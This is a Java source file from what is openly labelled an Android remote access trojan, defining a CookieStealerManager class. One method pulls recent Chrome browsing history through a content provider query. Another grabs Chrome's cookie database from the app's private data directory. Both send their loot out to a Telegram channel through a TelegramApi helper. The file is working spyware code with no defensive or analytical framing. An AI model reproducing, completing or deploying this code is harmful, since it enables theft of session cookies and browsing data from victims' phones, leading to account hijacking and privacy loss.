package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class CookieStealerManager {
    private Context context;
    public CookieStealerManager(Context context) { this.context = context; }

    public void stealChromeHistory() {
        StringBuilder sb = new StringBuilder("<b>🌐 Chrome History</b>\n\n");
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://com.android.chrome.browser/bookmarks"),
                new String[]{"title", "url"}, "bookmark = 0", null, "date DESC LIMIT 30");
            if (cursor != null && cursor.moveToFirst()) {
                do { sb.append("<b>").append(cursor.getString(0)).append("</b>\n<code>").append(cursor.getString(1)).append("</code>\n\n"); } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { sb.append("Not accessible: ").append(e.getMessage()); }
        TelegramApi.sendMessage(sb.toString());
    }

    public void stealCookies() {
        File cookieFile = new File("/data/data/com.android.chrome/app_chrome/Default/Cookies");
        if (cookieFile.exists()) TelegramApi.sendFile(cookieFile, "Chrome Cookies");
        else TelegramApi.sendMessage("❌ Requires root/older Android.");
    }
}
